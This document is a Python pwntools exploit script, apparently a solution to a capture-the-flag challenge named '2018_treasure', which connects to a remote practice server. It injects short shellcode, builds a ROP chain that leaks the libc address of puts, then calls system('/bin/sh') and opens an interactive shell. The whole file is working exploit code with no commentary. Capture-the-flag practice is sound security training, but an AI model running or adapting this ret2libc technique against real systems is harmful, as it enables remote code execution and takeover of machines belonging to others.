from pwn import *

context(os = 'linux', arch = 'amd64', log_level = 'debug')
# io = process('2018_treasure')
io = remote('node4.buuoj.cn', 28419)
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
libc = ELF('libc-2.27.so')
elf = ELF('2018_treasure')
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
pop_rdi_ret = 0x400b83
treasure_ret = 0x400ab8

shellcode = asm('push rsp; pop rsi; mov rdx, r11; syscall; ret;')
io.sendlineafter('will you continue?(enter \'n\' to quit) :', 'y')
io.sendlineafter('start!!!!', shellcode)
rop_chain = p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(treasure_ret)
io.send(rop_chain)
libc_base = u64(io.recvline()[:-1].ljust(8, b'\x00')) - libc.sym['puts']
log.success('libc_base: ' + hex(libc_base))

shellcode = asm('xor rax, rax; ret;')
io.sendlineafter('will you continue?(enter \'n\' to quit) :', 'y')
io.sendlineafter('start!!!!', shellcode)

shellcode = asm('push rsp; pop rsi; mov rdx, r11; syscall; ret;')
io.sendlineafter('will you continue?(enter \'n\' to quit) :', 'y')
# gdb.attach(io)
io.sendlineafter('start!!!!', shellcode)
bin_sh = libc_base + next(libc.search(b'/bin/sh\x00'))
system = libc_base + libc.sym['system']
rop_chain = p64(pop_rdi_ret) + p64(bin_sh) + p64(system)
io.send(rop_chain)
# pause()
io.interactive()
